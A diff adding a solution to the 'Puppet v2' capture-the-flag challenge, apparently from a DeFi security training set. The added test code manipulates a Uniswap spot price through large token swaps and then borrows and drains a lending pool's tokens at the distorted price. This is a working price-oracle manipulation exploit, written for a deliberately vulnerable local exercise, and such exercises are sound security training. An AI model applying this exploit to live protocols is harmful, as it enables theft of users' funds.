@@ -82,6 +82,56 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // trying without a contract
+        let tokenAmountAtLending = await this.token.balanceOf(this.lendingPool.address);
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, POOL_INITIAL_TOKEN_BALANCE);
+
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            1,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            Math.floor(Date.now()/1000) + 1000
+        );
+
+        let wethRequired = await this.lendingPool.calculateDepositOfWETHRequired(tokenAmountAtLending);
+        const wethAmount = ethers.utils.parseEther("19.0");
+
+        await attacker.sendTransaction({
+            to: this.weth.address,
+            value: wethAmount,
+        });
+
+        await this.weth.connect(attacker).approve(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
+
+        await this.lendingPool.connect(attacker).borrow(tokenAmountAtLending.div(wethRequired).mul(wethAmount));
+
+        const myTokenAmount = await this.token.balanceOf(attacker.address);
+
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            myTokenAmount,
+            1,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            Math.floor(Date.now()/1000) + 1000
+        );
+
+        tokenAmountAtLending = await this.token.balanceOf(this.lendingPool.address);
+
+        await this.lendingPool.connect(attacker).borrow(tokenAmountAtLending);
+
+        let myWethAmount = await this.weth.balanceOf(attacker.address);
+
+        await this.weth.connect(attacker).approve(this.uniswapRouter.address, myWethAmount);
+
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            myWethAmount,
+            1,
+            [this.weth.address, this.token.address],
+            attacker.address,
+            Math.floor(Date.now()/1000) + 1000
+        ); 
     });
 
     after(async function () {
